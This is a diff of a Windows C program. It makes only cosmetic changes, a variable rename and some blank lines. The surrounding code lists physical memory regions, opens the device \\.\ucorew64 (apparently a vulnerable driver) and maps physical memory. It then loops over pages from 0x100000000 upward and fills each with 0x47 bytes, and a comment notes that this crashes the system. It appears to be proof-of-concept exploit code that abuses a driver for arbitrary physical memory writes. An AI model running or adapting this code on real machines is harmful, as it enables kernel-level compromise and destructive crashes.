@@ -16,30 +16,28 @@ int main(char argc, char** argv)
 	NTSTATUS status = FALSE;
 
 	DWORD bytesReturned = 0;
-	int memoryRegions = -1;
+	int memRegionsCount = -1;
 
-	memoryRegions = GetPhysicalMemoryLayout(NULL);
-	if (memoryRegions == -1) {
+	memRegionsCount = GetPhysicalMemoryLayout(NULL);
+	if (memRegionsCount == -1) {
 		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
 		return -1;
 	}
-	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memoryRegions, sizeof(MEMORY_REGION));
+	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memRegionsCount, sizeof(MEMORY_REGION));
 	if (memRegion == NULL) {
 		fprintf(stderr, "[!] calloc() failed.\n");
 		return -1;
 	}
-	memoryRegions = GetPhysicalMemoryLayout(memRegion);
-	if (memoryRegions == -1) {
+	memRegionsCount = GetPhysicalMemoryLayout(memRegion);
+	if (memRegionsCount == -1) {
 		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
 		return -1;
 	}
 	
 	printf("physical memory regions\n");
-	for (int i = 0; i < memoryRegions; i++) {
+	for (int i = 0; i < memRegionsCount; i++) {
 		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
 	}
-
-
 
 	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
 
@@ -66,6 +64,7 @@ int main(char argc, char** argv)
 	/*
 	Trying to write 0x100000000 to 0x150000000 will cause the system to crash
 	*/
+
 	for (__int64 page = 0x100000000; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
 		MapPhysicalMemory(hPhysicalMemory, page, 0x1000, buf);
 		memset(buf, 0x47, 0x1000);
